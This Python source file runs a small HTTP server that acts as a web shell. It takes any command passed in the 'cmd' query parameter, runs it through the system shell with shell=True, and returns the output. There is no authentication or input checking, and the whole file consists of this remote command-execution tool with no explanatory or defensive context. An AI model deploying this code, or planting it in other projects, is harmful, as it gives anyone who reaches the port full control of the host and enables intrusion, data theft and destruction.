from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess
import urllib.parse


class S(SimpleHTTPRequestHandler):

    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        out = ""
        if query:
            print(f"Query: {query}")
            cmd = urllib.parse.unquote(query.split("cmd=")[1].split("&")[0])
            print(f"cmd: {cmd}")

            try:
                out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                print(f"out: {out}")
            except Exception as e:
                out=str(e)
        
        out = str(out)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(bytes(out, encoding='utf-8'))
        return

def run(server_class=HTTPServer, handler_class=S, port=3001):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

if __name__ == '__main__':
    from sys import argv

    print("Running...")

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()